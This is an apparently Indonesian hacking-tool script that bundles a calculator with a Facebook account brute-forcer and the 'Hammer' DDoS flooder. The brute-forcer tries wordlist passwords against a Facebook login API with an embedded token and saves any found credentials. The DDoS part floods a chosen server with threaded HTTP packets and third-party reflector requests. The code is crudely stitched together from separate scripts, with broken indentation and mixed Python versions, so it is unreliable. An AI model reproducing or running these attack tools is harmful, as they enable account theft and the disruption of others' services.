import requests
import os, sys, time
os.system('clear')
x = 'ArilTamvan'
y = '4R1L-1TX'

def login():
    print ('\033[1;96m\033[1;93m=====[Tolls Pribadi]=====')
    print
    user = raw_input('\033[1;96mUsername :')
    pasw = raw_input('Password :')
    print
    if user == x and pasw == y:
         print ('\033[1;96m\033[1;93m=====[Login Sucses]=====')
         time.sleep(4)
         sys.exit

    else:
        print ('\033[1;96m\033[1;93m=====[Password Salah]=====')
        time.sleep(2)
        login()

if __name__ == '__main__':
        login()
print
print ('10. Calculator')
print ('11. NyolongAkun')
print ('12.Ddos Hammer')
print
pilih = input('pilih menu :')
if pilih == 10:
    print (40*'\033[1;96m\033[1;93m_')
    print ('\033[1;96m\033[1;92m==============[Matematika]==============')
    print (40*'\033[1;96m\033[1;93m_')
    print ('\033[1;96m1. penjumlahan')
    print ('2. pengurangan')
    print ('3. perkalian')
    print ('4. pembagian')
    print ('5. sisa bagi')
    print ('6. pemangkatan')
    print (40*'\033[1;96m\033[1;93m_')
    print ('\033[1;96m\033[1;92m==============[Matematika]==============')
    print (40*'\033[1;96m\033[1;93m_')
    print
    pilih = input('pilih menu :')
    print
    print
  
if pilih == 1:
    print
    angka_1 = input('[+]angka pertama[+]=>')
    angka_2 = input('[+]angka dua[+]=>')
    total = angka_1 + angka_2
    print
    print('[?]Jawaban nya[?]=>'), total
    
elif pilih == 2:
    print
    angka_1 = input('[-]angka pertama[-]=>')
    angka_2 = input('[-]angka dua[-]=>')
    total = angka_1 - angka_2
    print
    print('[?]Jawaban nya[?]=>'), total
   
elif pilih == 3:
    print
    angka_1 = input('[x]angka pertama[x]=>')
    angka_2 = input('[x]angka dua[x]=>')
    total = angka_1 * angka_2
    print
    print('[?]Jawaban nya[?]=>'), total

elif pilih == 4:
    print
    angka_1 = input('[/]angka pertama[/]=>')
    angka_2 = input('[/]angka dua[/]=>')
    total = angka_1 / angka_2
    print
    print('[?]Jawaban nya[?]=>'), total
   
elif pilih == 5:
    print
    angka_1 = input('[%]angka pertama[%]=>')
    angka_2 = input('[%]angka dua[%]=>')
    total = angka_1 % angka_2
    print
    print('[?]Jawaban nya[?]=>'), total
    
elif pilih == 6:
    print
    angka_1 = input('[**]angka pertama[**]=>')
    angka_2 = input('[**]angka dua[**]=>')
    total = angka_1 ** angka_2
    print
    print('[?]Jawaban nya[?]=>'), total
 
if pilih == 11:
     import os, sys, time, datetime, random, json
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Cheking Acces\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m Author \033[32;1m[\033[37;1m4R1L-1TX\033[32;1m]\n\033[35;1m------------------------------------------'


def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
        time.sleep(2)
        toolbar_width = 25
        sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
        sys.stdout.flush()
        for i in range(toolbar_width):
            sys.stdout.write('\r')
            sys.stdout.flush()
            sys.stdout.write('\033[37;1m[')
            sys.stdout.write('\033[36;1m#\033[37;1m' * (i + 1))
            sys.stdout.flush()
            time.sleep(5.0 / 100)
        try:
            rq = requests.get('http://facebook.com')
            time.sleep(3.5)
            print '\033[37;1m] \033[35;1m~> \033[32;1mSucces '
            time.sleep(2.0)
            start()
        except requests.exceptions.ConnectionError:
            time.sleep(3.5)
            print '\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi'
            time.sleep(1.5)
            sys.exit()

    except KeyboardInterrupt:
    	time.sleep(3.5)
        exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mProgram berhenti\n')

def start():
        try:
            os.system('reset')
            print banner
            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
            time.sleep(3.0)
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
            time.sleep(3.0)
            print
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('succes.txt', 'w')
                        dapat.write('[ID]=> ' + email + '\n')
                        dapat.write('[PW]=> ' + pw)
                        dapat.close()
                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
                        print '\033[32;1m[=] \033[37;1mProgram Finish'
                        sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('succesCP.txt', 'w')
                            ceks.write('[ID]=> ' + email + '\n')
                            ceks.write('[PW]=> ' + pw)
                            ceks.close()
                            print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
                            print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                            print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
                            print '\033[33;1m[=] \033[37;1mProgram Finish'
                            sys.exit()
                except requests.exceptions.ConnectionError:
                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
                    sys.exit()

        except IOError:
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
            sys.exit()

ceknet()

if pilih == 12:
      from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
        global uagent
        uagent=[]
        uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
        uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
        uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
        return(uagent)


def my_bots():
        global bots
        bots=[]
        bots.append("http://validator.w3.org/check?uri=")
        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
        return(bots)


def bot_hammering(url):
        try:
                while True:
                        req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
                        print("\033[94mbot is hammering...\033[0m")
                        time.sleep(.1)
        except:
                time.sleep(.1)


def down_it(item):
        try:
                while True:
                        packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host,int(port)))
                        if s.sendto( packet, (host, int(port)) ):
                                s.shutdown(1)
                                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
                        else:
                                s.shutdown(1)
                                print("\033[91mshut<->down\033[0m")
                        time.sleep(.1)
        except socket.error as e:
                print("\033[91mno connection! server maybe down\033[0m")
                #print("\033[91m",e,"\033[0m")
                time.sleep(.1)


def dos():
        while True:
                item = q.get()
                down_it(item)
                q.task_done()


def dos2():
        while True:
                item=w.get()
                bot_hammering(random.choice(bots)+"http://"+host)
                w.task_done()


def usage():
        print (''' \033[92m     Hammer-DDos Attack Tool v1.0
        It is the end user's responsibility to obey all applicable laws.
        It is just for server testing script. Your ip is visible. \n
        usage : python3 hammer.py [-s] [-p] [-t]
        -h : help
        -s : server ip
        -p : port default 80
        -t : turbo default 135 \033[0m''')
        sys.exit()


def get_parameters():
        global host
        global port
        global thr
        global item
        optp = OptionParser(add_help_option=False,epilog="Hammers")
        optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
        optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
        optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
        optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
        optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
        opts, args = optp.parse_args()
        logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
        if opts.help:
                usage()
        if opts.host is not None:
                host = opts.host
        else:
                usage()
        if opts.port is None:
                port = 80
        else:
                port = opts.port
        if opts.turbo is None:
                thr = 135
        else:
                thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
        if len(sys.argv) < 2:
                usage()
        get_parameters()
        print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
        print("\033[94mPlease wait...\033[0m")
        user_agent()
        my_bots()
        time.sleep(5)
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,int(port)))
                s.settimeout(1)
        except socket.error as e:
                print("\033[91mcheck server ip and port\033[0m")
                usage()
                while True:
                for i in range(int(thr)):
                        t = threading.Thread(target=dos)
                        t.daemon = True  # if thread is exist, it dies
                        t.start()
                        t2 = threading.Thread(target=dos2)
                        t2.daemon = True  # if thread is exist, it dies
                        t2.start()
                start = time.time()
                #tasking
                item = 0
                while True:
                        if (item>1800): # for no memory crash
                                item=0
                                time.sleep(.1)
                        item = item + 1
                        q.put(item)
                        w.put(item)
                q.join()
                w.join()
if __name__ == '__main__':
	exit()
